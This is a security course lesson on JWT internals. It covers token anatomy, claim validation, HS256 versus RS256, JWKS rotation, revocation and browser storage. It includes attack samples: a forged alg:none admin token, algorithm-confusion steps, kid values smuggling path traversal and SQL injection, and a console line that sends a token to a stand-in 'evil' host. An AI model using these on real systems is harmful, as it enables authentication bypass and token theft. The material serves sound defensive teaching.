# Day 114 ⭐

**L-114** · JWT internals — header/payload/signature, HS256 vs RS256, the `alg:none` attack

**Time:** 3 hrs · **Mode:** NEW · **Marquee day**

> JWTs are everywhere and are misunderstood everywhere. Today you will **decode one by hand, forge
> one, and then verify one properly** — because the vulnerabilities in this technology come almost
> entirely from people treating the token as trustworthy before the signature has been checked.

---

# Part 1 — Anatomy

A JWT is three base64url-encoded parts joined by dots:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxNyIsInJvbGUiOiJVU0VSIiwiZXhwIjoxNzU1MTc2NDAwfQ.4Adcj3UFYzPUVaVF43FmMab6RlaQD8A9V8wFzzht-KQ
└──────────── HEADER ────────────┘ └──────────────── PAYLOAD ────────────────┘ └───────── SIGNATURE ─────────┘
```

```json
// header
{ "alg": "HS256", "typ": "JWT", "kid": "key-2026-08" }

// payload — "claims"
{ "sub": "17", "role": "USER", "iat": 1755172800, "exp": 1755176400,
  "iss": "https://auth.acme.com", "aud": "https://api.acme.com", "jti": "8f14e45f" }
```

```
signature = HMAC-SHA256( base64url(header) + "." + base64url(payload), secret )
```

**Decode one right now.** Paste any JWT into `base64 -d`, or:

```bash
echo 'eyJzdWIiOiIxNyIsInJvbGUiOiJVU0VSIn0' | base64 -d
```

## ⚠️ The most important fact about JWTs

> **A JWT is signed, not encrypted. Anyone can read the payload.**
>
> **Base64 is encoding, not encryption** (Day 112).

Consequences you must internalise:

- **Never put secrets in a JWT.** No passwords, no card numbers, no personal data you would not print
  on a postcard. The user, their browser extensions, any proxy, and your logs can all read it.
- The signature guarantees **integrity and authenticity** — that the token was issued by the holder
  of the key and has not been altered. It guarantees nothing about confidentiality.
- If you need confidentiality, that is **JWE** (JSON Web Encryption), which is a different and much
  less commonly used specification.

## Registered claims

| Claim | Meaning | Verify? |
|---|---|---|
| `iss` | Issuer | ✅ must match your expected issuer |
| `sub` | Subject — the principal | ✅ |
| **`aud`** | Audience — who this token is *for* | ✅ **must match your service** |
| **`exp`** | Expiry (seconds since epoch) | ✅ **mandatory** |
| `nbf` | Not before | ✅ if present |
| `iat` | Issued at | ✅ useful for max-age policies |
| **`jti`** | Unique token id | ✅ for a revocation list |

**`aud` is the one people skip and it matters.** Without checking it, a token your auth server issued
for *service A* is accepted by *service B* — so a low-privilege service can replay a token it
received to a high-privilege one. This is a real attack in microservice estates.

# Part 2 — The attacks

## ⭐ 1. `alg: none`

The specification defines an "unsecured JWT" with `"alg": "none"` and an empty signature. Several
early libraries honoured it during *verification*.

```json
{ "alg": "none", "typ": "JWT" }
{ "sub": "17", "role": "ADMIN" }
```
```
eyJhbGciOiJub25lIn0.eyJzdWIiOiIxNyIsInJvbGUiOiJBRE1JTiJ9.
                                                          ↑ signature omitted entirely
```

**The attacker rewrites the payload, sets `alg` to `none`, deletes the signature — and a naive
verifier accepts it.** Instant privilege escalation, no key required.

The root cause is a design mistake worth naming:

> **The token tells the verifier which algorithm to use — and the token is attacker-controlled
> (Day 105).**

```java
// ❌ trusting the header
Jwts.parser().setSigningKey(key).parseClaimsJws(token);      // older APIs inferred alg from header

// ✅ the algorithm is decided by CONFIGURATION, not by the token
JwtParser parser = Jwts.parser()
        .verifyWith(key)
        .sig().add(Jwts.SIG.HS256).and()      // ← ONLY this algorithm is accepted
        .requireIssuer("https://auth.acme.com")
        .requireAudience("https://api.acme.com")
        .build();
```

## ⭐ 2. Algorithm confusion (RS256 → HS256)

Subtler, and it still catches people.

```
Server verifies RS256 using its PUBLIC key — which is, by definition, public.
Attacker changes  "alg": "RS256"  →  "HS256"
Attacker signs the forged token with HMAC, using the PUBLIC KEY AS THE HMAC SECRET.
A verifier that picks the algorithm from the header calls HMAC-verify with the public key…
…and it matches.
```

**The public key was never meant to be a secret, so the attacker already has it.** The confusion is
that HMAC and RSA verification take a "key" argument of the same shape, and a library that dispatches
on the header's `alg` will happily use one where the other was intended.

Same fix, and it is the same rule: **pin the accepted algorithm in configuration; never read it from
the token.**

## 3. Weak HMAC secret

`HS256` with `secret` or `changeit` as the key is brute-forceable offline in seconds — tools like
`hashcat` and `jwt_tool` do exactly this. **Use at least 256 bits of `SecureRandom` output**, from a
secret manager, never from source control.

## 4. Missing expiry validation

A token with no `exp`, or a verifier that does not check it, is a **permanent credential**. Some
libraries only validate `exp` if you ask.

## 5. `kid` injection

```json
{ "alg": "HS256", "kid": "../../public/keys/attacker.pem" }
{ "alg": "HS256", "kid": "key' UNION SELECT 'attackersecret" }
```

`kid` selects which key to verify with — and it is attacker-controlled. If you use it to build a file
path or a SQL query you have path traversal or SQL injection in your *auth* layer. **Treat `kid` as
an opaque allow-list key** (Day 108's rule).

## 6. Blindly trusting an unverified payload

```java
// 💀 decoding is not verifying
String[] parts = token.split("\\.");
Claims claims = parse(base64Decode(parts[1]));       // ← ANY payload the attacker wants
if ("ADMIN".equals(claims.get("role"))) { … }
```

This looks absurd written out and appears in real code, usually as "just reading the user id for
logging" that later becomes an authorization decision.

> **Verify the signature *first*, then read claims. Never the reverse.**

# Part 3 — HS256 vs RS256

| | **HS256** (HMAC) | **RS256 / ES256** (asymmetric) |
|---|---|---|
| Keys | One shared secret | Private (sign) + public (verify) |
| Who can create tokens | **Anyone who can verify** | Only the private-key holder |
| Who can verify | Only holders of the secret | **Anyone**, with the public key |
| Speed | Very fast | Slower to sign; verification is fine |
| Key distribution | Every verifier needs the secret | Publish the public key via JWKS |
| Rotation | Coordinated across all services | Publish a new key; verifiers refresh |
| Size | Compact | Larger signature |

**The decision rule is one sentence:**

> **If the issuer and the verifier are the same service, HS256 is fine. If anyone else verifies,
> use RS256 or ES256** — because with HMAC, *the ability to verify is the ability to forge*.

Ten microservices sharing an HMAC secret means any one of them — or anyone who compromises any one
of them — can mint a token for any user with any role. That is the argument, and it is decisive for
distributed systems.

`ES256` (ECDSA P-256) is worth preferring over `RS256` for new systems: much smaller signatures, and
faster.

## JWKS — key distribution done properly

```http
GET https://auth.acme.com/.well-known/jwks.json
```
```json
{ "keys": [
  { "kty": "RSA", "kid": "key-2026-08", "use": "sig", "alg": "RS256", "n": "…", "e": "AQAB" },
  { "kty": "RSA", "kid": "key-2026-05", "use": "sig", "alg": "RS256", "n": "…", "e": "AQAB" }
]}
```

The verifier fetches this, caches it, and selects the key by the token's `kid`. **Two keys are
published during rotation** so old tokens remain verifiable while new ones use the new key — which is
what makes rotation possible without downtime.

Two cautions: **cache the JWKS** (a fetch per request is a self-inflicted DoS on your auth server),
and **bound the refresh on an unknown `kid`** — otherwise an attacker sending random `kid` values
forces a JWKS fetch per request.

# Part 4 — Verifying properly

```java
// The complete checklist
JwtParser parser = Jwts.parser()
    .verifyWith(publicKey)                         // 1. the KEY
    .sig().add(Jwts.SIG.RS256).and()               // 2. PINNED algorithm — not from the token
    .requireIssuer("https://auth.acme.com")        // 3. iss
    .requireAudience("https://api.acme.com")       // 4. aud
    .clockSkewSeconds(60)                          // 5. tolerate small clock differences
    .build();

Jws<Claims> jws = parser.parseSignedClaims(token); // throws if the signature or claims fail
Claims claims = jws.getPayload();                  // exp and nbf validated automatically

// 6. Application-level checks — the library will not do these for you
if (revocationList.contains(claims.getId())) throw new UnauthorizedException();   // jti
if (claims.getIssuedAt().isBefore(user.credentialsChangedAt())) throw …;          // stale token
```

That last check is the practical answer to "how do I invalidate tokens on password change" without a
full revocation list: store `credentials_changed_at` on the user and reject any token issued before
it. **One column, and "log out everywhere" works.**

## The revocation problem

**This is JWT's fundamental trade-off**, and it is the thing to be able to discuss:

> **A signed token is valid until it expires. You cannot un-issue it.**

Every mitigation reintroduces state:

| Approach | Cost |
|---|---|
| **Short expiry (5–15 min)** + refresh tokens | ✅ The standard answer. Bounds the window. |
| **A denylist of revoked `jti`s** | A store lookup per request — you now have sessions, with extra steps |
| **A `credentials_changed_at` timestamp** | One field; invalidates *all* of a user's tokens at once |
| **A token version per user** | Same, incremented on logout-everywhere |
| Introspection endpoint (RFC 7662) | A network call per request — fully stateful |

The honest conclusion, which is the strongest thing you can say about JWTs in an interview:

> **If you need instant revocation, you need server-side state — and at that point a session
> (Day 113) is simpler.** JWTs are best where short-lived tokens are acceptable and the verifier is
> separate from the issuer.

## Where to store a JWT in a browser

| Location | XSS | CSRF | Verdict |
|---|---|---|---|
| `localStorage` | ❌ **readable by any script** | ✅ safe | ❌ common and wrong |
| `sessionStorage` | ❌ same | ✅ | ❌ |
| JS-readable cookie | ❌ same | ❌ | ❌ worst of both |
| **`HttpOnly` cookie** | ✅ protected | ❌ needs `SameSite` + CSRF token | ✅ **best available** |
| In memory only | ✅ mostly | ✅ | ✅ good; lost on refresh — pair with a refresh cookie |

> **`localStorage` is the most common JWT mistake.** One XSS and every token is exfiltrated to the
> attacker's server, usable from their machine until expiry.

**The pattern that wins for browser apps:** the **access token in memory** (never persisted) and the
**refresh token in an `HttpOnly; Secure; SameSite=Strict` cookie** scoped to the refresh endpoint
only. XSS cannot read either durable credential; a page refresh silently obtains a new access token.
That is Day 115.

## When a JWT is the right tool

✅ Service-to-service auth, mobile and third-party clients, OAuth/OIDC (Days 116–117), short-lived
signed URLs, and any case where a *different* party verifies than issues.

❌ As a session replacement in a browser app with one backend, when instant revocation is required,
or when the payload would grow large — remember it is sent on **every** request.

## Common mistakes

| Mistake | Consequence |
|---|---|
| Putting sensitive data in the payload | It is readable by anyone holding the token |
| Reading claims before verifying | Complete authentication bypass |
| Accepting the algorithm from the header | `alg:none`; RS256→HS256 confusion |
| Weak HMAC secret | Cracked offline in seconds |
| Not validating `exp` | A permanent credential |
| Not validating `aud` | A token for one service accepted by another |
| Using `kid` to build a path or query | Traversal or injection in the auth layer |
| Sharing an HMAC secret across services | Any service can forge any user's token |
| Storing tokens in `localStorage` | XSS exfiltrates them |
| Long-lived access tokens | An unrevocable credential with a long window |
| No JWKS caching | A fetch per request against your auth server |
| Choosing JWT to avoid a session store, then adding a denylist | Sessions, with extra steps |

## Interview questions

**Q: What is a JWT and what does the signature guarantee?**
Three base64url parts — header, payload, signature. The signature provides integrity and
authenticity: the token was issued by the key holder and has not been altered. It provides **no
confidentiality** — the payload is encoded, not encrypted, so anyone can read it.

**Q: Explain the `alg:none` attack.**
The specification allows an unsecured token with `alg: none` and an empty signature. A verifier that
takes the algorithm from the header will accept a forged payload with no signature at all. The root
cause is that the token dictates how it should be verified, and the token is attacker-controlled. Pin
the algorithm in configuration.

**Q: What is algorithm confusion?**
An attacker changes `RS256` to `HS256` and signs the token using the server's *public* key as the
HMAC secret. A verifier that dispatches on the header's `alg` will verify it successfully, because
the public key was never secret. Same fix: pin the algorithm.

**Q: HS256 or RS256?**
HS256 when the issuer and verifier are the same service. RS256 or ES256 whenever anyone else
verifies, because with HMAC the ability to verify is the ability to forge — so ten services sharing a
secret means any one of them can mint an admin token.

**Q: How do you revoke a JWT?**
Strictly, you cannot — it is valid until it expires. In practice: short expiry with refresh tokens,
plus a `credentials_changed_at` timestamp so all of a user's tokens are invalidated at once, or a
`jti` denylist. Each mitigation reintroduces server state, which is the honest argument for sessions
when instant revocation is a requirement.

**Q: Where do you store a JWT in a browser?**
Not `localStorage` — XSS reads it. Keep the access token in memory and the refresh token in an
`HttpOnly; Secure; SameSite=Strict` cookie scoped to the refresh endpoint.

**Q: What must you validate?**
Signature with a pinned algorithm and the correct key, then `iss`, `aud`, `exp` and `nbf` with a
small clock skew allowance, then application checks — revocation and issued-before-credential-change.

## Mini task

1. Decode a JWT by hand with `base64 -d`. Read all three parts.
2. Craft an `alg:none` token: take a valid one, change the role to `ADMIN`, set `alg` to `none`,
   drop the signature. Try it against a naive verifier you write, and then against a correctly
   configured one.
3. Implement the algorithm-confusion attack against a deliberately naive verifier: sign with HMAC
   using the RSA public key bytes.
4. Generate a JWT with a weak secret and crack it with `jwt_tool` or `hashcat`.
5. Write a verifier with the full six-step checklist. Then remove each check in turn and write down
   the exact attack it enabled.
6. Set up a JWKS endpoint with two keys and rotate: issue tokens with the new `kid` while old tokens
   still verify.
7. Implement `credentials_changed_at` and demonstrate "log out everywhere" with no denylist.
8. Store a token in `localStorage`, then run `fetch('https://evil/'+localStorage.token)` in the
   console. That is the entire XSS exfiltration.
9. Measure the size difference between a session cookie and a JWT with ten claims, and multiply by
   your request rate.
